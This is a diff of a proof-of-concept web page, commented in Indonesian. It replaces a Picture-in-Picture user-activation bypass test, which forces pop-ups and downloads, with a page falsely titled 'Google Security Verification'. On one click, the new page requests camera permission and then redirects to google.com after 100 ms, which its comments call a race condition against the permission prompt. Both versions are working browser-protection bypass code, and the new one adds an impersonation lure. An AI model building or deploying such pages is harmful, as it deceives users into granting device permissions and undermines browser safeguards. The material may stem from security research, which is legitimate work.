@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PiP User Activation Bypass</title>
+<title>Google Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
@@ -18,9 +18,9 @@
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 PiP Activation Bypass</h2>
-  <p>Klik tombol di bawah untuk membuka PiP. Setelah itu, klik tombol di dalam PiP untuk memicu pop-up atau download.</p>
-  <button id="startBtn">Open PiP</button>
+  <h2>🔒 Google Security Verification</h2>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengizinkan kamera dan diarahkan ke Google.</p>
+  <button id="startBtn">Verify Account & Allow Camera</button>
   <div id="status">[*] Ready...</div>
 </div>
 
@@ -30,124 +30,44 @@
 
   var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
-  var popupUrl = 'https://www.google.com'; // URL yang akan dibuka
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[PiP Activation] " + msg);
+    console.log("[Camera+Redirect] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK) - BUKA PiP
+  // 1. TRIGGER (KLIK) - RACE CONDITION
   // ============================================
-  btn.addEventListener('click', async function() {
-    log("[*] Membuka PiP...");
+  btn.addEventListener('click', function() {
+    log("[*] Memulai camera + instant redirect...");
 
+    // ============================================
+    // 2. MINTA IZIN KAMERA (LANGSUNG)
+    // ============================================
     try {
-      if (!window.documentPictureInPicture) {
-        alert("Document Picture-in-Picture tidak didukung.");
-        return;
-      }
-
-      const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 400,
-        height: 300
-      });
-
-      log('PiP Window Opened.');
-
-      // ============================================
-      // 2. TULIS KONTEN PiP DENGAN TOMBOL
-      // ============================================
-      pipWindow.document.open();
-      pipWindow.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <meta charset="UTF-8">
-          <title>PiP Activation Bypass</title>
-          <style>
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-              background: #fff;
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-              align-items: center;
-              min-height: 100vh;
-              padding: 20px;
-              text-align: center;
-            }
-            h3 { font-size: 20px; color: #333; margin-bottom: 10px; }
-            p { font-size: 14px; color: #666; margin-bottom: 20px; }
-            button {
-              padding: 15px 30px;
-              background: #1a73e8;
-              color: #fff;
-              border: none;
-              border-radius: 8px;
-              font-size: 16px;
-              font-weight: bold;
-              cursor: pointer;
-            }
-            button:hover { background: #1557b0; }
-          </style>
-        </head>
-        <body>
-          <h3>Click to Verify</h3>
-          <p>This button will trigger a pop-up in the main window.</p>
-          <button id="pipBtn">Verify & Open Google</button>
-
-          <script>
-            (function() {
-              document.getElementById('pipBtn').addEventListener('click', function() {
-                // Kirim pesan ke parent untuk memicu pop-up
-                if (window.opener) {
-                  window.opener.postMessage({ type: 'OPEN_POPUP', url: '${popupUrl}' }, '*');
-                }
-              });
-            })();
-          <\/script>
-        </body>
-        </html>
-      `);
-      pipWindow.document.close();
-
-      // ============================================
-      // 3. LISTENER PESAN DARI PiP (TRIGGER POPUP)
-      // ============================================
-      window.addEventListener('message', function(e) {
-        if (e.data && e.data.type === 'OPEN_POPUP') {
-          log("[!] Triggering popup from PiP activation...");
-          
-          // Coba buka pop-up (seharusnya diblokir jika tidak ada user activation)
-          var popup = window.open(e.data.url, '_blank');
-          
-          if (popup) {
-            log("[+] Popup opened successfully! User activation bypassed.");
-          } else {
-            log("[-] Popup blocked by browser.");
-          }
-
-          // Sebagai alternatif, coba download file
-          try {
-            var a = document.createElement('a');
-            a.href = 'data:text/plain;base64,SGVsbG8gV29ybGQh'; // "Hello World!"
-            a.download = 'test.txt';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            log("[+] Download triggered successfully!");
-          } catch (e) {
-            log("[-] Download failed: " + e.message);
-          }
-        }
-      });
-
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(function(stream) {
+          log("[+] Kamera DIIZINKAN!");
+          stream.getTracks().forEach(function(t) { t.stop(); });
+        })
+        .catch(function(err) {
+          log("[-] Kamera ditolak: " + err.name);
+        });
     } catch (e) {
-      log('Error: ' + e.message);
+      log("[-] Error: " + e.message);
     }
+
+    // ============================================
+    // 3. REDIRECT KE GOOGLE (INSTAN)
+    // ============================================
+    setTimeout(function() {
+      log("[*] Redirect ke Google.com...");
+      try {
+        window.location.replace('https://www.google.com');
+      } catch (e) {}
+    }, 100); // 100ms untuk memberi waktu prompt kamera muncul
+
   }, { once: true });
 
 })();
